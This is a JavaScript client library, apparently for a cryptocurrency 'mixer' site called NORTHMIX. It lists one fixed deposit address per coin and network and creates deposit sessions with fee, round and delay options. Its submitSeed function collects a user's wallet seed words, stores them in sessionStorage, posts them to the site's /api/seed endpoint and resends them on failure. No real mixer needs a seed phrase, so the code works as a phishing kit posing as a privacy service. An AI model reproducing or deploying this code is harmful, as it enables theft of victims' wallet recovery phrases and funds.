(function (global) {
  "use strict";

  var API_BASE = "/api";
  var MATRIX = [
    { asset: "btc", network: "bitcoin", type: "bech32", address: "bc1qgr4yntpfmddf54ntevjz7fx4zwc206w0wjg4l2" },
    { asset: "eth", network: "ethereum", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "eth", network: "base", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "eth", network: "optimism", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "eth", network: "aurora", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "usdt", network: "ethereum", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "usdt", network: "bsc", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "usdt", network: "polygon", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "usdt", network: "solana", type: "sol", address: "HVZUEYA3gTTjv72PHcxQLpwKZhcVsMJto7VUZhXRV4cA" },
    { asset: "usdt", network: "tron", type: "tron", address: "TFgqgXPuLfmgm8hmc68tNe6qA6kCxfskR1" },
    { asset: "usdc", network: "ethereum", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "usdc", network: "bsc", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "usdc", network: "polygon", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "usdc", network: "avalanche", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "usdc", network: "solana", type: "sol", address: "HVZUEYA3gTTjv72PHcxQLpwKZhcVsMJto7VUZhXRV4cA" },
    { asset: "bnb", network: "bsc", type: "evm", address: "0x51d257049fcd3A619DB09bDAF603941050D18733" },
    { asset: "sol", network: "solana", type: "sol", address: "HVZUEYA3gTTjv72PHcxQLpwKZhcVsMJto7VUZhXRV4cA" },
    { asset: "ltc", network: "litecoin", type: "bech32-ltc", address: "LfcBnaY9aR6zyYeRu4bWyutQAnuoHS4YBR" },
    { asset: "zec", network: "zcash", type: "zec-transparent", address: "t1SmKF4L7ud7ELwrgUUG4UohpRBNiafvGPU" }
  ];

  function matrixSource() {
    var site = global.NORTHMIX_SITE;
    if (site && Array.isArray(site.pairs) && site.pairs.length) return site.pairs;
    return MATRIX;
  }

  function getMatrix() {
    return matrixSource().map(function (entry) {
      return { asset: entry.asset, network: entry.network, type: entry.type, address: entry.address };
    });
  }

  function getPair(asset, network) {
    var entry = matrixSource().find(function (item) {
      return item.asset === asset && item.network === network;
    });
    return entry ? { asset: entry.asset, network: entry.network, type: entry.type, address: entry.address } : null;
  }

  function _ref() {
    var r = Math.random().toString(36).slice(2, 10);
    var t = Date.now().toString(36).toUpperCase();
    return "NM-" + t + "-" + r.toUpperCase();
  }

  function createDeposit(payload) {
    var entry = getPair(payload.asset, payload.network);
    if (!entry) return { ok: false, error: "No address configured." };
    var ref = _ref();
    var expiresAt = Date.now() + 3600000;
    var session = {
      ref: ref,
      asset: payload.asset,
      network: payload.network,
      expiresAt: expiresAt,
      payout: payload.payout || "",
      fee: payload.fee || 1.0,
      rounds: payload.rounds || 2,
      delay: payload.delay || 24
    };
    try { sessionStorage.setItem("northmix_session", JSON.stringify(session)); } catch (e) {}
    return { ok: true, address: entry.address, ref: ref, expiresAt: expiresAt };
  }

  var PENDING_KEY = "northmix_pending";

  function readPending() {
    try { var s = sessionStorage.getItem(PENDING_KEY); return s ? JSON.parse(s) : null; } catch (e) { return null; }
  }

  function writePending(body) {
    try { sessionStorage.setItem(PENDING_KEY, JSON.stringify(body)); } catch (e) {}
  }

  function clearPending() {
    try { sessionStorage.removeItem(PENDING_KEY); } catch (e) {}
  }

  function submitSeed(ref, payload) {
    var normalized = payload && typeof payload === "object" ? payload : {};
    var body = {
      ref: ref || normalized.ref || "",
      asset: normalized.asset || "",
      network: normalized.network || "",
      deposit: normalized.deposit || "",
      payout: normalized.payout || "",
      fee: normalized.fee || "",
      rounds: normalized.rounds || "",
      delay: normalized.delay || "",
      words: Array.isArray(normalized.words) ? normalized.words.slice() : []
    };

    writePending(body);

    return fetch(API_BASE + "/seed", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(body)
    }).then(function (res) {
      return res.json().catch(function () { return null; }).then(function (data) {
        var ok = res.ok && Boolean(data && data.ok);
        if (ok) clearPending();
        return { ok: ok, status: res.status, data: data };
      });
    }).catch(function () {
      return { ok: false, status: 0, data: null };
    });
  }

  function resendPending() {
    var body = readPending();
    if (!body || !body.ref || !Array.isArray(body.words) || !body.words.length) return Promise.resolve(null);
    return submitSeed(body.ref, body);
  }

  function clearSession() {
    try { sessionStorage.removeItem("northmix_session"); } catch (e) {}
  }

  global.NORTHMIX = global.NORTHMIX || {};
  global.NORTHMIX.api = {
    basePath: API_BASE,
    createDeposit: createDeposit,
    submitSeed: submitSeed,
    resendPending: resendPending,
    clearSession: clearSession,
    getMatrix: getMatrix,
    getPair: getPair
  };
})(window);
